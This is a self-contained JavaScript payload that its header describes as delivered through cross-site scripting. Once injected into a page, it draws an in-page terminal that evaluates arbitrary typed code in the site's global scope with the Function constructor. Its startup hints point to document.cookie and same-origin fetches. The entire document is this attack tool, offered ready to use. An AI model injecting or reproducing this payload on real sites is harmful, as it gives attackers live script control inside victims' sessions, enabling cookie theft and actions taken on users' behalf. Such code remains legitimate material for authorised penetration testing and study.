# this script opens a terminal with direct code access, delivered via xss.


<script>
(function() {
    // --- Configuration ---
    const terminalHeight = '400px';
    const terminalWidth = '90%'; // Adjust as needed
    const terminalZIndex = '9999'; // Try to keep it on top

    // --- 1. Create Styles ---
    const styles = `
        #xss-terminal-container {
            position: fixed;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            width: ${terminalWidth};
            height: ${terminalHeight};
            background-color: #1e1e1e; /* Dark background */
            color: #d4d4d4; /* Light text */
            font-family: 'Consolas', 'Monaco', monospace;
            border: 2px solid #888;
            border-radius: 5px;
            overflow: hidden; /* Contain children */
            display: flex;
            flex-direction: column;
            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
            z-index: ${terminalZIndex};
            font-size: 13px; /* Base font size */
        }
        #xss-terminal-output {
            flex-grow: 1; /* Take available space */
            padding: 10px;
            overflow-y: auto; /* Scroll for output */
            white-space: pre-wrap; /* Wrap lines but preserve whitespace */
            word-wrap: break-word; /* Break long words */
            scrollbar-width: thin; /* For Firefox */
            scrollbar-color: #666 #333; /* For Firefox */
        }
        /* Webkit Scrollbars */
        #xss-terminal-output::-webkit-scrollbar {
          width: 8px;
        }
        #xss-terminal-output::-webkit-scrollbar-track {
          background: #333;
        }
        #xss-terminal-output::-webkit-scrollbar-thumb {
          background-color: #666;
          border-radius: 4px;
          border: 2px solid #333;
        }
        #xss-terminal-input-line {
            display: flex;
            border-top: 1px solid #555;
            background-color: #252526; /* Slightly different bg for input area */
        }
        #xss-terminal-input-line span {
            padding: 8px 10px;
            background-color: #333;
            color: #4ec9b0; /* Prompt color */
            user-select: none; /* Prevent selecting the '>' */
        }
        #xss-terminal-input {
            flex-grow: 1;
            background-color: transparent; /* Inherit from parent */
            color: #d4d4d4; /* Match terminal text */
            border: none;
            padding: 8px 10px;
            font-family: inherit; /* Use terminal font */
            font-size: inherit; /* Use terminal font size */
            outline: none; /* Remove focus outline */
        }
        .xss-terminal-log-input { color: #569cd6; } /* Blue for input */
        .xss-terminal-log-result { color: #ce9178; } /* Orange-ish for results */
        .xss-terminal-log-error { color: #f44747; } /* Red for errors */
        .xss-terminal-log-info { color: #b5cea8; } /* Greenish for info */
    `;

    // Inject styles into the head
    const styleSheet = document.createElement("style");
    styleSheet.type = "text/css";
    styleSheet.innerText = styles;
    document.head.appendChild(styleSheet);

    // --- 2. Create HTML Elements ---
    const container = document.createElement('div');
    container.id = 'xss-terminal-container';

    const outputDiv = document.createElement('div');
    outputDiv.id = 'xss-terminal-output';

    const inputLineDiv = document.createElement('div');
    inputLineDiv.id = 'xss-terminal-input-line';

    const promptSpan = document.createElement('span');
    promptSpan.textContent = '>';

    const inputField = document.createElement('input');
    inputField.id = 'xss-terminal-input';
    inputField.type = 'text';
    inputField.placeholder = 'Inject JS code here and press Enter...';
    inputField.setAttribute('autocomplete', 'off'); // Disable browser suggestions
    inputField.setAttribute('autocorrect', 'off');
    inputField.setAttribute('autocapitalize', 'off');
    inputField.setAttribute('spellcheck', 'false');

    // Assemble the structure
    inputLineDiv.appendChild(promptSpan);
    inputLineDiv.appendChild(inputField);
    container.appendChild(outputDiv);
    container.appendChild(inputLineDiv);

    // Append to the body
    document.body.appendChild(container);

    // --- 3. Terminal Logic ---
    const terminalOutput = outputDiv; // Use the created elements
    const terminalInput = inputField;

    function logToTerminal(message, type = 'log') {
        const entry = document.createElement('div');
        let textContent = '';
        let className = 'xss-terminal-log-info'; // Default class

        // Handle different types of objects for logging
        if (typeof message === 'object' && message !== null) {
            try {
                textContent = JSON.stringify(message, null, 2); // Pretty print objects
            } catch (e) {
                textContent = message.toString(); // Fallback for complex objects
            }
        } else if (message === undefined) {
            textContent = 'undefined';
        } else if (message === null) {
            textContent = 'null';
        } else {
            textContent = message.toString();
        }

        switch (type) {
            case 'input':
                className = 'xss-terminal-log-input';
                textContent = `> ${textContent}`; // Add prompt back for input logs
                break;
            case 'result':
                className = 'xss-terminal-log-result';
                // textContent is already formatted
                break;
            case 'error':
                className = 'xss-terminal-log-error';
                textContent = `Error: ${textContent}`;
                break;
            case 'info':
            default:
                className = 'xss-terminal-log-info';
                break;
        }

        entry.textContent = textContent;
        entry.className = className; // Apply style class
        terminalOutput.appendChild(entry);

        // Scroll to the bottom
        terminalOutput.scrollTop = terminalOutput.scrollHeight;
    }

    terminalInput.addEventListener('keydown', function(event) {
        if (event.key === 'Enter' && terminalInput.value.trim() !== '') {
            const code = terminalInput.value;
            logToTerminal(code, 'input'); // Log the command entered

            try {
                // Execute the code using Function constructor in the global scope
                // 'this' inside the function will refer to the global object (window)
                const result = new Function('return ' + code)(); // Attempt to return result

                if (result !== undefined) {
                     logToTerminal(result, 'result');
                } else {
                     // If execution yields undefined (e.g., assignment, declaration), log success subtly
                     // logToTerminal('Executed successfully.', 'info'); // Optional: uncomment for feedback on void returns
                }
            } catch (error) {
                // Try executing without 'return' if the first attempt failed (e.g., for statements like console.log)
                try {
                    new Function(code)();
                     // logToTerminal('Executed successfully.', 'info'); // Optional: uncomment for feedback on void returns
                } catch (innerError) {
                    // Log the most relevant error
                    logToTerminal(innerError.message || innerError, 'error');
                    console.error("XSS Terminal execution error:", innerError); // Log full error to browser console
                }
            } finally {
                 terminalInput.value = ''; // Clear the input field regardless of success/error
                 event.preventDefault(); // Prevent default Enter behavior
            }
        }
    });

    // --- Initial Message ---
    logToTerminal("XSS JavaScript Terminal Initialized.", 'info');
    logToTerminal("WARNING: Execute commands with caution!", 'error');
    logToTerminal("Example: try 'document.cookie', 'alert(1)', 'fetch(\"/\").then(r=>r.text()).then(console.log)'", 'info');

    // Focus the input field initially
    terminalInput.focus();

})(); // Immediately invoke the function
</script>
